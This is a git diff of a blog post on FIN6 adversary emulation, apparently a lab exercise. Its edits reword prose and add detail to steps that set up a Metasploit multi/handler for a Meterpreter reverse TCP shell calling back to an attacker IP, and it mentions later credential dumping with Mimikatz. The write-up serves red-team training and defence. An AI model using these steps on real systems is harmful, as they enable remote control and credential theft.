@@ -16,7 +16,7 @@ FIN6 is thought to be a financially motivated cyber-crime group. The group has a
 
 ### 1.1 - Phishing: Spearphishing Attachment [**T1566.001**](https://attack.mitre.org/techniques/T1566/001/) and via Service [**T1566.003**](https://attack.mitre.org/techniques/T1566/003/)
 
-As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery. FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks. 
+Due to their financial motives, FIN6 adopts a practical delivery strategy. They use various techniques, such as social engineering through direct messages on LinkedIn, spear-phishing, compromising e-commerce sites, and it's been speculated that they might have acquired access to previously compromised networks through negotiations or purchases.
 
 ### 1.2 - C2 Framework
 
@@ -24,9 +24,9 @@ FIN6 has made use of CobaltStrike and Metasploit. For this demonstration, we'll 
 
 _MsfVenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:
 
-One single tool
-Standardized command line options
-Increased speed
+- One single tool
+- Standardized command line options
+- Increased speed
 
 _MsfVenom_ has a wide range of options available:
 
@@ -58,7 +58,7 @@ Take note that in order to dump credentials with Mimikatz later on the victim's 
 
 ### 1.4 - Generate Payload Handler
 
-With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the <kbd>exploit/multi/handler</kbd> metasploit module.
+Now that we've successfully created our Windows x64 executable payload, the next step is to set up a handler that can receive the connection back from our target. We will use the <kbd>exploit/multi/handler</kbd> metasploit module.
 
 Normally, you can use <kbd>exploit/multi/handler</kbd> this way:
 
@@ -68,7 +68,7 @@ msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > 
 ```
 
-To check the current configuration of the exploit handler, we can use the command to list down the various options for this module:
+To check the current configuration of the exploit handler, we can use the command <kbd>show options</kbd> to list down the various options for this module:
 
 ```bash
 msf6 exploit(multi/handler) > show options
@@ -76,7 +76,7 @@ msf6 exploit(multi/handler) > show options
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}
 
-As youn can see, the payload is currently set to default <kbd>generic/shell_reverse_tcp</kbd>. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:
+Base on the result, the payload is currently set to default <kbd>generic/shell_reverse_tcp</kbd>. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated which is the <kbd>windows/x64/meterpreter/reverse_tcp</kbd>:
 
 ```bash
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
@@ -93,7 +93,6 @@ set LHOST [Attacker IP]
 Once done, you should now have a similar configuration on the screenshot below.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Final_Show_Options.png){:width="100%"}
-
 
 To start the handler, just execute the following command.
 
